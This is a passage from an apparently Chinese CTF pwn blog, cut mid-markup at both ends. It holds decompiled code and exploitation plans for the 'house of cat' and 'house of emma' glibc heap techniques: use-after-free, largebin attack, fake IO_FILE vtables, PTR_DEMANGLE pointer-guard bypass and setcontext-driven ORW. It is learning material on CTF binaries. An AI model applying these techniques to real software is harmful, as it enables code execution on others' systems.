[rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s2; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strstr</span>(a1, <span class="string">&quot;QWB&quot;</span>);                       <span class="comment">// 如果没找到返回null</span></span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  *v4 = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  v5 = v4 + <span class="number">3</span>;</span><br><span class="line">  s2 = strtok(a1, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;LOGIN&quot;</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    *(a2 + <span class="number">8</span>) = <span class="number">1</span>;                              <span class="comment">// 登录状态</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;DOG&quot;</span>, s2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;CAT&quot;</span>, s2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;MONKEY&quot;</span>, s2) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;FISH&quot;</span>, s2) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;PIG&quot;</span>, s2) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;WOLF&quot;</span>, s2) )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;DUCK&quot;</span>, s2) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;GOLF&quot;</span>, s2) )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( *(a2 + <span class="number">8</span>) || <span class="built_in">strcmp</span>(<span class="string">&quot;TIGER&quot;</span>, s2) )</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                  *(a2 + <span class="number">8</span>) = <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  *(a2 + <span class="number">8</span>) = <span class="number">9</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                *(a2 + <span class="number">8</span>) = <span class="number">8</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              *(a2 + <span class="number">8</span>) = <span class="number">7</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            *(a2 + <span class="number">8</span>) = <span class="number">6</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(a2 + <span class="number">8</span>) = <span class="number">5</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(a2 + <span class="number">8</span>) = <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(a2 + <span class="number">8</span>) = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(a2 + <span class="number">8</span>) = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = strtok(<span class="number">0LL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 != <span class="built_in">strchr</span>(v8, <span class="string">&#x27;|&#x27;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  *a2 = v8;</span><br><span class="line">  s1 = strtok(<span class="number">0LL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;r00t&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  s = v5 + <span class="number">5</span>;</span><br><span class="line">  v6 = <span class="built_in">strstr</span>(v5, <span class="string">&quot;QWXF&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  *v6 = <span class="number">0</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">  *(a2 + <span class="number">16</span>) = s;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">sub_1DF3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(a1 + <span class="number">8</span>) == <span class="number">1</span> &amp;&amp; !<span class="built_in">strcmp</span>(*(a1 + <span class="number">16</span>), <span class="string">&quot;admin&quot;</span>) )</span><br><span class="line">    admin_use[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  result = *(a1 + <span class="number">8</span>);                           <span class="comment">// CAT</span></span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = strtok(*(a1 + <span class="number">16</span>), <span class="string">&quot;$&quot;</span>);</span><br><span class="line">    v3 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = dword_4014;</span><br><span class="line">      <span class="keyword">if</span> ( *v3 == dword_4014 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = admin_use[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( admin_use[<span class="number">0</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v2 = c_read_0x17();</span><br><span class="line">          <span class="keyword">if</span> ( v2 == <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">return</span> edit();                      <span class="comment">// 固定写0x30</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v2 &lt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">switch</span> ( v2 )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">                  <span class="keyword">return</span> show();</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">                  <span class="keyword">return</span> add();</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">                  <span class="keyword">return</span> delete();              <span class="comment">// uaf</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c_write(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆了挺久也没搞清楚，是我太菜了 orz<br>后面就是看了网上师傅的逆向结果<img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695469703377-59d7f4ad-b96b-47cd-b3e8-08e5ea30df0c.png" alt="img"></p><p>add：用的calloc 限制了size大小 0x418~0x46F</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  c_write(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  v1 = c_read_0x17();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || *(&amp;chunk_ptr + v1) )</span><br><span class="line">    <span class="keyword">return</span> c_write(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  c_write(<span class="string">&quot;plz input your cat size:\n&quot;</span>);</span><br><span class="line">  size = c_read_0x17();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x417</span> || size &gt; <span class="number">0x46F</span> )</span><br><span class="line">    <span class="keyword">return</span> c_write(<span class="string">&quot;invalid size!\n&quot;</span>);</span><br><span class="line">  *(&amp;chunk_ptr + v1) = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, size);</span><br><span class="line">  <span class="keyword">if</span> ( !*(&amp;chunk_ptr + v1) )</span><br><span class="line">    <span class="keyword">return</span> c_write(<span class="string">&quot;error!\n&quot;</span>);</span><br><span class="line">  chunk_size[v1] = size;</span><br><span class="line">  c_write(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *(&amp;chunk_ptr + v1), chunk_size[v1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete：存在uaf<br>show：正常<br>edit：固定写入0x30，限制了2次次数（开始自己做的时候就没注意这里qwq）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_1916</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> c_write(<span class="string">&quot;nonono!!!!\n&quot;</span>);</span><br><span class="line">  --dword_4010;</span><br><span class="line">  c_write(<span class="string">&quot;plz input your cat idx:\n&quot;</span>);</span><br><span class="line">  v1 = c_read_0x17();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !*(&amp;chunk_ptr + v1) )</span><br><span class="line">    <span class="keyword">return</span> c_write(<span class="string">&quot;invalid!\n&quot;</span>);</span><br><span class="line">  c_write(<span class="string">&quot;plz input your content:\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *(&amp;chunk_ptr + v1), <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路及过程"><a href="#思路及过程" class="headerlink" title="思路及过程"></a>思路及过程</h4><p>因为和house of emma挺相似的，思路还是差不多的，不过house of cat不用去修改 __pointer_chk_guard<br>1、先泄露地址<br>2、然后利用 largebin attack去修改stderr<br>3、然后利用 largebin attack去修改top_chunk<br>4、触发assert<br>伪造的vtable<br><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695471465454-d1e0e80a-3363-4a0d-9891-db6b1afb411e.png" alt="img"></p><p>偏移跳转到_IO_wfile_seekoff<br><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695471474200-381c19a9-6d25-4631-bcae-e6570eff0b52.png" alt="img"></p><p>之后会跳转到_IO_switch_to_wget_mode，到这里就是我们要利用的地方了</p><p><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695471547084-cbeb7269-4c60-402f-8037-8913e653c93e.png" alt="img"><br><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695471592164-eadf2c91-c790-4c8a-b2f2-a2a465c37a9f.png" alt="img"></p><p><code>rdi = stderr ---&gt; rax1 = stderr + 0xa0 ----&gt; rax2 = rax1 + 0xe0 ----&gt; call rax2 + 0x18</code><br>同时rdx &#x3D; rax1 + 0x20<br>所以可以伪造IO：<br><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695472575109-23d5b336-9a07-49f0-b7da-936f9b2cc92c.png" alt="img"></p><p>然后就会进入setcontext+61去执行rdx+0xe0–&gt;orw<br><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695472753347-b36ddcfa-9371-4c7d-8ad8-3ecc97ff45ff.png" alt="img"><img src="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1695472789314-a1ff6182-692f-4d6c-841e-60fde3f9f42e.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house-of-emma学习以及复现</title>
      <link href="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h3><p>参考：   <a href="https://lololo-pwn.github.io/2022/03/15/House-of-Emma/">桥下少年</a><br>emma也是利用house of kiwi的触发assert机制，<br>house of kiwi是去走的<code>fflush--&gt;__sync__</code><br>house of emma 是走的 <code>fxprintf --&gt; __locked_vfxprinf --&gt; __vfprintf_internal --&gt; _IO_default_xsputn</code><br>通过修改<code>_IO_file_jumps</code>为<code>_IO_cookie_jumps+offset</code>，使得最后+偏移为<code>_IO_cookie_write</code><br>然后在<code>_IO_cookie_write</code>中会直接调用指针，设置好偏移就可以去控制执行流</p><span id="more"></span><h5 id="1、assert去触发调用IO-file-jumps调用函数的利用"><a href="#1、assert去触发调用IO-file-jumps调用函数的利用" class="headerlink" title="1、assert去触发调用IO_file_jumps调用函数的利用"></a>1、assert去触发调用IO_file_jumps调用函数的利用</h5><p>这里的思路还是控制vtable去执行我们想要的地方<br>虽然存在vtable_check，不过可以在他规定范围去修改，这里利用的就是_IO_cookie_jumps</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>里面存在的<code>_IO_cookie_read、_IO_cookie_write、_IO_cookie_seek、_IO_cookie_close</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)<span class="comment">// read</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)<span class="comment">// write</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)<span class="comment">// seek</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)<span class="comment">// close</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个函数中都存在直接的函数调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; c</span><br></pre></td></tr></table></figure><p>当然在函数调用前存在一个检测 PTR_DEMANGLE (这里也只是了解)<br>检测逻辑：将其ROR移位11位后再和指针异或</p><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694868834998-4049b689-4295-45ac-a9a8-c6dd8a3649c0.png" alt="img"></p><p>调试过程可以发现，利用的 fs[0x30]，可以去修改该处值为我们已知值</p><p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694860262323-4922f196-d243-4d6e-93df-652d9c47e286.png" alt="img"></p><p>这里我一直搞不明白的就是这个值在libc_base-0x2890 ，只能记住吗、还是有方法去调试得知 </p><h5 id="SigreturnFrame-与setcontext"><a href="#SigreturnFrame-与setcontext" class="headerlink" title="SigreturnFrame()与setcontext"></a>SigreturnFrame()与setcontext</h5><p>SigreturnFrame()其实也是利用setcontext来实现的，所有在布置setcontext的偏移时可以直接利用SigreturnFrame()来实现</p><h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>1、修改<code>stderr --&gt; _IO_2_1_stderr</code>_<br>2、修改<code>libc_base - 0x2890</code>为已知值<br>3、构造IO_FILE ，将vtable修改到对应偏移位置<br>比如<code>_IO_cookie_jumps + 0x40</code>,去调用<code>__sync</code>时就是到<code>_IO_cookie_write</code><br>4、设置好偏移去执行<code>secontext--&gt;orw</code><br>5、assert触发IO</p><h3 id="2021湖湘杯house-of-emma"><a href="#2021湖湘杯house-of-emma" class="headerlink" title="2021湖湘杯house of emma"></a>2021湖湘杯house of emma</h3><p>参考 ：<br><a href="https://blog.wjhwjhn.com/archives/751/">House Of Emma | wjh’s blog</a><br><a href="https://blog.csdn.net/weixin_46483787/article/details/122808870">Ayakaaaa师傅的博客</a></p><h4 id="IDA："><a href="#IDA：" class="headerlink" title="IDA："></a>IDA：</h4><p>第一次见这样形式的菜单堆，刚开始就懵了qwq</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 